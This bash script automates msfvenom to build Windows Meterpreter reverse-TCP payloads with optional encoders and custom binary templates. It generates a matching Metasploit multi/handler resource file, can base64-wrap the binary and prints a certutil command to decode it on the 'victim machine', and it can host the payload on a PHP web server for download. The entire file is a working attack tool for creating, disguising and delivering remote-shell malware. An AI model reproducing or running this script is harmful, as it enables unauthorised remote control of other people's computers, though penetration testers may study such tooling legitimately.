#!/bin/bash

echo MSFVenom Binary and Resource file Generator Script. Designed to work with Metasploit multi/handler stub.
echo NOT optimized for anything other than windows payloads. Use at your own risk.
echo Press Ctrl-C at anytime to exit this script.


function setpayload {
	#set payload options
	read -p "Enter Payload [windows/meterpreter/reverse_tcp]: " payload
	if [ -z "$payload" ] || [ "$payload" = 'windows/meterpreter/reverse_tcp' ]
		then
		payload='windows/meterpreter/reverse_tcp'
	fi
	read -p "Enter LHOST ["$(ifconfig | grep -A1 eth0 | grep inet | awk '{print $2}')"]: " lhost
	if [ -z "$lhost" ]
		then
		lhost="$(ifconfig | grep -A1 eth0 | grep inet | awk '{print $2}')"
	fi
	read -p "Enter LPORT [4444]: " lport
	if [ -z "$lport" ] || [ "$lport" = '4444' ]
		then
		lport=4444
	fi
}


function setprepend {
	# Set prepend options
	read -p "Enter PrependMigrate [false]: " prependmigrate
	if [ -z "$prependmigrate" ] || [ "$prependmigrate" = 'false' ]
		then
		prependmigrate='false'
	else
		if [ "$prependmigrate" = 'true' ]
			then
			read -p "Enter PrependMigrateProc [explorer.exe]: " prependmigrateproc
			if [ -z "$prependmigrateproc" ]
				then
				prependmigrateproc=explorer.exe
			fi
		fi
	fi
	if [ $prependmigrate = 'false' ]
		then
		advopt=''
	else
		advopt="PrependMigrate=$prependmigrate PrependMigrateProc=$prependmigrateproc"
	fi
}


function setarch {
	# Set Arch
	if [ "$(echo $payload | cut -d"/" -f2)" = 'x64' ]
		then
		arch='x64'
	else
		arch='x86'
	fi
}

function setenc {
	# Set Encoder & iterations options
	read -p "Use msfvenom encoder? [no]: " enc1
	if [ -z "$enc1" ] || [ "$enc1" = 'no' ]
		then
		return
	else
		echo
		echo Accepted Encoders:
		if [ "$arch" = 'x86' ]
		then
			msfvenom --list encoders | grep "x86"
		elif [ "$arch" = 'x64' ]
		then
			msfvenom --list encoders | grep "x64"
		fi
		echo
		read -p "Enter Encoder type: " encoder
		read -p "Enter Encode Iterations ["1"]: " iterations
		if [ -z "$iterations" ]
		then
			iterations='1'
		fi
	fi

	if [ -z "$encoder" ] && [ -z "$iterations"]
		then
		encopt=''
	else
		encopt="-e $encoder -i $iterations"
	fi
}

function setcustbin {
	# Set Custom Binary option
	read -p "Use custom binary template? [no]: " custbin
	if [  -z "$custbin" ] || [ "$custbin" = 'no' ] || [ "$custbin" = 'n' ]
		then
		custbin=''
		custbinpath=''
	else
		if [ "$custbin" = 'yes' ] || [ "$custbin" = 'y' ]
			then
			read -p "Enter custom binary path: " custbinpath
		fi
	fi
	if [ -z "$custbin" ] && [ -z "$custbinpath"]
		then
		custbinopt=''
	else
		custbinopt="-x $custbinpath -k"
	fi
}


function setformat {
	# Set file format.. 
	echo Formats: dll,exe,ps1,vbs
	read -p "Set format [exe]: " format
	if [ -z "$format" ] || [ "$format" = 'exe' ]
		then
		format='exe'
		ext='exe'
	else
		if [ "$format" = 'psh' ] || [ "$format" = 'powershell' ]
			then
			ext='ps1'
		fi
	fi
}

function setoutput {
	# Set output options
	read -p "Set output location ["$(pwd)"]: " location
	if [ -z "$location" ] || [ "$location" = "$(pwd)" ]
		then
		location="$(pwd)"
	fi
	read -p "Set output filename [bin_output]: " filename
	if [ -z "$filename" ] || [ "$output" = 'bin_output' ]
		then
		filename='bin_output'
	fi
}


function genresfile {
	## Set resource file options
	read -p "Set resource filename [$filename]: " resfilename
	if [ -z "$resfilename" ] || [ "$resfilename" = "$filename" ]
		then
		resfilename="$filename"
	fi
	## Generate resource file
	echo Generating..
	echo use multi/handler > "$location/$resfilename.rc"
	echo set payload $payload >> "$location/$resfilename.rc"
	echo set lhost $lhost >> "$location/$resfilename.rc"
	echo set lport $lport >> "$location/$resfilename.rc"
	if [ $prependmigrate = 'true' ]
		then
		echo set PrependMigrate $prependmigrate >> "$location/$resfilename.rc"
		echo set PrependMigrateProc $prependmigrateproc >> "$location/$resfilename.rc"
	fi
	echo run -j -z >> "$location/$resfilename.rc"
}


function genbinfile {
	## Generate binary
	echo DEBUG: msfvenom -a $arch --platform windows $custbinopt -p $payload LHOST=$lhost LPORT=$lport $advopt -f $format $encopt -o "$location/$filename.$ext"
	msfvenom -a $arch --platform windows $custbinopt -p $payload LHOST=$lhost LPORT=$lport $advopt -f $format $encopt -o "$location/$filename.$ext"
}


function encb64 {
	## encode additional base64 layer
	read -p "Encode with openssl Base64? [no]: " eb64
	if [ -z "$eb64" ] || [ "$eb64" = 'no' ] || [ "$eb64" = 'n' ]
		then
		eb64=''
	else
		if [ "$eb64" = 'yes' ] || [ "$eb64" = 'y' ]
			then
			openssl enc -base64 -in "$location/$filename.$ext" -out "$location/$filename.b64"
			echo File is now encoded - Ensure the file is decoded before running in victim machine. Windows command to decode:
			echo certutil -decode "$filename.b64" "decoded_$filename.$ext"
		fi
	fi
}


function hostsvr {
	## Host file on server
	read -p "Host file? [no]: " hsvr
	if [ -z "$hsvr" ] || [ "$hsvr" = 'no' ] || [ "$hsvr" = 'n' ]
		then
		hsvr=''
	else
		if [ "$hsvr" = 'yes' ] || [ "$hsvr" = 'y' ]
			then
			read -p "Port number? [8080]: " hport
			if [ -z "$hport" ]
				then
				hport="8080"
			fi
			gnome-terminal -x php -S 0.0.0.0:$hport -t "$location"
			echo
			echo PHP Server has started. Download the file at "http://$(ifconfig | grep -A1 eth0 | grep inet | awk '{print $2}'):$hport/$filename.$format"
		else
			return
		fi
	fi
}


function runmsfrc {
	## Run metasploit framework resource file
	read -p "Run resource file? [no]: " runrc
	if [ -z "$runrc" ] || [ "$runrc" = 'no' ] || [ "$runrc" = 'n' ]
		then
		runrc=''
	else
		if [ "$runrc" = 'yes' ] || [ "$runrc" = 'y' ]
			then
			echo Running "$location/$resfilename.rc"
			echo
			gnome-terminal -x msfconsole -r "$location/$resfilename.rc"
		fi
	fi
}


#run functions
setpayload
setprepend
setarch
setenc
setcustbin
setformat
setoutput
genresfile
genbinfile
encb64
hostsvr
runmsfrc

echo
echo
echo Script has reached EOF. Exiting.
